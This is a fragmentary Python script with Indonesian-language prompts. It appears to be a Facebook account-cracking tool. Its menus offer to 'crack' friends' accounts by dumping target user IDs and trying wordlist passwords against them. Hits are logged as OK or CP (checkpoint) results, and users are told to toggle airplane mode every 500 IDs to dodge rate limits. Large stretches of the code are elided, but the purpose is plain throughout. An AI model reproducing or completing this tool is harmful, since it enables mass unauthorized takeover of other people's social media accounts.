...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mDvinzy_XD')
...
for x in range(10):
	...
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android 6.0; Infinix-X600-LTE Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 GSA/12.44.23.23.arm64'
def uaku():
	try:
...
\______   \_______ __ ___/  |_  ____  
 ...
 |______  / |__|  |____/ |__|  \___  >
        \/                         \/ 	
{m}•{k}•{h}•{sir} Author : Azell {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n└── \x1b[1;92mLogin Sukses | python x.py");exit()
			except Exception as e:
...
def menu(id):
	...
	cetak(nel('\tScript Version : V2.5'))
	print(f'└─ Your Idz : {id}')
	print(f'└─ Your Ip  : {ip}')
	print(f'└─ Status : Pertamax')
	print('')
	cetak('[bold green]└─ 01. Crack Friend \n└─ 02. Hasill Result \n└─ 03. Chat Author \n└─ 00. Exit[bold green]')
	_____Dvinzy__XD_____ = input('\n└─  : ')
	if _____Dvinzy__XD_____ in ['1']:
		dump_massal()
	elif _____Dvinzy__XD_____ in ['2']:
		result()
	elif _____Dvinzy__XD_____ in ['3']:
		os.system("xdg-open https://wa.me/+6283116621262?text=Hallo+Bang")
	elif _____Dvinzy__XD_____ in ['0']:
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('└─ 01 Hasil CP Anda ')
	print('└─ 02 Hasil OK Anda ')
	print('└─ 00 Kembali	')
	kz = input('\n└─ Pilih : ')
	if kz in ['1','01']:
...
def dump_massal():
	...
	try:
		...
		print('└─ Masukkan Angka Anjing, Malah Huruff Tololl')
		exit()
	if jum<1 or jum>100:
		print('└─ Failed Dump Id ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('└─ input target  Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		...
		print(f'└─{k} Failed Dump Id maybe id is not public {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak('[bold green]└─ 01. Akun Old \n└─ 02. Akun New (Disarankan) \n└─ 03. Akun Random [bold green]')
	print('')
	hu = input('└─ Pilih : ')
	if hu in ['1','01']:
		...
		exit()
	cetak('[bold green]└─ 01. Validate[bold green]')
	print('')
	hc = input('└─ Pilih : ')
	if hc in ['1','01']:
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] Putri123,Putri12345,KataSandi[white] '))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	cetak(nel(f'{P}─ METODE Z SEDANG DI LUNCURKAN JADI MOHON BERSABAR '))
	print('')
	print(f'└─ Hasil {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'└─ Hasil {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	print(f'└─ Mainkan Mode Pesawat Setiap {m}500 id{x} Idz\n')
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x} [•]{k} Thank you for using the script{x}[•]  ')
		time.sleep(2)
		exit()
#--------------------[ METODE-MOBILE]-----------------#
def validate(idf,pwv):
	...
	sys.stdout.write(f"\r└─> Validate {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
